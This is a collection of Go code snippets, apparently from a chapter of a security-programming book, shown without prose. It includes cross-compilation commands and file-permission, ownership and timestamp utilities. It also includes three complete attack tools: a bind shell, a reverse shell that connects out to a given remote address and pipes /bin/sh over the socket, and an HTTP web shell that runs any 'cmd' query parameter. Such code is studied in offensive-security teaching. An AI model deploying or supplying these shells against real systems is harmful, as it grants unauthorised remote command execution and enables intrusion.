["```go\nSet GOOS=linux\nSet GOARCH=amd64\ngo build myapp\n```", "```go\nGOOS=windows GOARCH=amd64 go build mypackage  \n```", "```go\n// Call back to a remote server and open a shell session\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"net\"\n   \"os\"\n   \"os/exec\"\n)\n\nvar shell = \"/bin/sh\"\n\nfunc main() {\n   // Handle command line arguments\n   if len(os.Args) != 2 {\n      fmt.Println(\"Usage: \" + os.Args[0] + \" <bindAddress>\")\n      fmt.Println(\"Example: \" + os.Args[0] + \" 0.0.0.0:9999\")\n      os.Exit(1)\n   }\n\n   // Bind socket\n   listener, err := net.Listen(\"tcp\", os.Args[1])\n   if err != nil {\n      log.Fatal(\"Error connecting. \", err)\n   }\n   log.Println(\"Now listening for connections.\")\n\n   // Listen and serve shells forever\n   for {\n      conn, err := listener.Accept()\n      if err != nil {\n         log.Println(\"Error accepting connection. \", err)\n      }\n      go handleConnection(conn)\n   }\n\n}\n\n// This function gets executed in a thread for each incoming connection\nfunc handleConnection(conn net.Conn) {\n   log.Printf(\"Connection received from %s. Opening shell.\", \n   conn.RemoteAddr())\n   conn.Write([]byte(\"Connection established. Opening shell.\\n\"))\n\n   // Use the reader/writer interface to connect the pipes\n   command := exec.Command(shell)\n   command.Stdin = conn\n   command.Stdout = conn\n   command.Stderr = conn\n   command.Run()\n\n   log.Printf(\"Shell ended for %s\", conn.RemoteAddr())\n} \n```", "```go\n// Call back to a remote server and open a shell session\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"net\"\n   \"os\"\n   \"os/exec\"\n)\n\nvar shell = \"/bin/sh\"\n\nfunc main() {\n   // Handle command line arguments\n   if len(os.Args) < 2 {\n      fmt.Println(\"Usage: \" + os.Args[0] + \" <remoteAddress>\")\n      fmt.Println(\"Example: \" + os.Args[0] + \" 192.168.0.27:9999\")\n      os.Exit(1)\n   }\n\n   // Connect to remote listener\n   remoteConn, err := net.Dial(\"tcp\", os.Args[1])\n   if err != nil {\n      log.Fatal(\"Error connecting. \", err)\n   }\n   log.Println(\"Connection established. Launching shell.\")\n\n   command := exec.Command(shell)\n   // Take advantage of reader/writer interfaces to tie inputs/outputs\n   command.Stdin = remoteConn\n   command.Stdout = remoteConn\n   command.Stderr = remoteConn\n   command.Run()\n} \n```", "```go\nGET /?cmd=whoami HTTP/1.0\\n\\n  \n```", "```go\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"net/http\"\n   \"os\"\n   \"os/exec\"\n)\n\nvar shell = \"/bin/sh\"\nvar shellArg = \"-c\"\n\nfunc main() {\n   if len(os.Args) != 2 {\n      fmt.Printf(\"Usage: %s <listenAddress>\\n\", os.Args[0])\n      fmt.Printf(\"Example: %s localhost:8080\\n\", os.Args[0])\n      os.Exit(1)\n   }\n\n   http.HandleFunc(\"/\", requestHandler)\n   log.Println(\"Listening for HTTP requests.\")\n   err := http.ListenAndServe(os.Args[1], nil)\n   if err != nil {\n      log.Fatal(\"Error creating server. \", err)\n   }\n}\n\nfunc requestHandler(writer http.ResponseWriter, request *http.Request) {\n   // Get command to execute from GET query parameters\n   cmd := request.URL.Query().Get(\"cmd\")\n   if cmd == \"\" {\n      fmt.Fprintln(\n         writer,\n         \"No command provided. Example: /?cmd=whoami\")\n      return\n   }\n\n   log.Printf(\"Request from %s: %s\\n\", request.RemoteAddr, cmd)\n   fmt.Fprintf(writer, \"You requested command: %s\\n\", cmd)\n\n   // Run the command\n   command := exec.Command(shell, shellArg, cmd)\n   output, err := command.Output()\n   if err != nil {\n      fmt.Fprintf(writer, \"Error with command.\\n%s\\n\", err.Error())\n   }\n\n   // Write output of command to the response writer interface\n   fmt.Fprintf(writer, \"Output: \\n%s\\n\", output)\n} \n```", "```go\ntype WalkFunc func(path string, info os.FileInfo, err error) error  \n```", "```go\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"os\"\n   \"path/filepath\"\n)\n\nfunc main() {\n   if len(os.Args) != 2 {\n      fmt.Println(\"Recursively look for files with the \" + \n         \"write bit set for everyone.\")\n      fmt.Println(\"Usage: \" + os.Args[0] + \" <path>\")\n      fmt.Println(\"Example: \" + os.Args[0] + \" /var/log\")\n      os.Exit(1)\n   }\n   dirPath := os.Args[1]\n\n   err := filepath.Walk(dirPath, checkFilePermissions)\n   if err != nil {\n      log.Fatal(err)\n   }\n}\n\nfunc checkFilePermissions(\n   path string,\n   fileInfo os.FileInfo,\n   err error,\n) error {\n   if err != nil {\n      log.Print(err)\n      return nil\n   }\n\n   // Bitwise operators to isolate specific bit groups\n   maskedPermissions := fileInfo.Mode().Perm() & 0002\n   if maskedPermissions == 0002 {\n      fmt.Println(\"Writable: \" + fileInfo.Mode().Perm().String() + \n         \" \" + path)\n   }\n\n   return nil\n} \n```", "```go\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"os\"\n   \"time\"\n)\n\nfunc main() {\n   if len(os.Args) != 2 {\n      fmt.Printf(\"Usage: %s <filename>\", os.Args[0])\n      fmt.Printf(\"Example: %s test.txt\", os.Args[0])\n      os.Exit(1)\n   }\n\n   // Change timestamp to a future time\n   futureTime := time.Now().Add(50 * time.Hour).Add(15 * time.Minute)\n   lastAccessTime := futureTime\n   lastModifyTime := futureTime\n   err := os.Chtimes(os.Args[1], lastAccessTime, lastModifyTime)\n   if err != nil {\n      log.Println(err)\n   }\n} \n```", "```go\ntype FileMode uint32  \n```", "```go\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"os\"\n   \"strconv\"\n)\n\nfunc main() {\n   if len(os.Args) != 3 {\n      fmt.Println(\"Change the permissions of a file.\")\n      fmt.Println(\"Usage: \" + os.Args[0] + \" <mode> <filepath>\")\n      fmt.Println(\"Example: \" + os.Args[0] + \" 777 test.txt\")\n      fmt.Println(\"Example: \" + os.Args[0] + \" 0644 test.txt\")\n      os.Exit(1)\n   }\n   mode := os.Args[1]\n   filePath := os.Args[2]\n\n   // Convert the mode value from string to uin32 to os.FileMode\n   fileModeValue, err := strconv.ParseUint(mode, 8, 32)\n   if err != nil {\n      log.Fatal(\"Error converting permission string to octal value. \", \n         err)\n   }\n   fileMode := os.FileMode(fileModeValue)\n\n   err = os.Chmod(filePath, fileMode)\n   if err != nil {\n      log.Fatal(\"Error changing permissions. \", err)\n   }\n   fmt.Println(\"Permissions changed for \" + filePath)\n} \n```", "```go\npackage main\n\nimport (\n   \"fmt\"\n   \"log\"\n   \"os\"\n   \"os/user\"\n   \"strconv\"\n)\n\nfunc main() {\n   // Check command line arguments\n   if len(os.Args) != 4 {\n      fmt.Println(\"Change the owner of a file.\")\n      fmt.Println(\"Usage: \" + os.Args[0] + \n         \" <user> <group> <filepath>\")\n      fmt.Println(\"Example: \" + os.Args[0] +\n         \" dano dano test.txt\")\n      fmt.Println(\"Example: sudo \" + os.Args[0] + \n         \" root root test.txt\")\n      os.Exit(1)\n   }\n   username := os.Args[1]\n   groupname := os.Args[2]\n   filePath := os.Args[3]\n\n   // Look up user based on name and get ID\n   userInfo, err := user.Lookup(username)\n   if err != nil {\n      log.Fatal(\"Error looking up user \"+username+\". \", err)\n   }\n   uid, err := strconv.Atoi(userInfo.Uid)\n   if err != nil {\n      log.Fatal(\"Error converting \"+userInfo.Uid+\" to integer. \", err)\n   }\n\n   // Look up group name and get group ID\n   group, err := user.LookupGroup(groupname)\n   if err != nil {\n      log.Fatal(\"Error looking up group \"+groupname+\". \", err)\n   }\n   gid, err := strconv.Atoi(group.Gid)\n   if err != nil {\n      log.Fatal(\"Error converting \"+group.Gid+\" to integer. \", err)\n   }\n\n   fmt.Printf(\"Changing owner of %s to %s(%d):%s(%d).\\n\",\n      filePath, username, uid, groupname, gid)\n   os.Chown(filePath, uid, gid)\n} \n```"]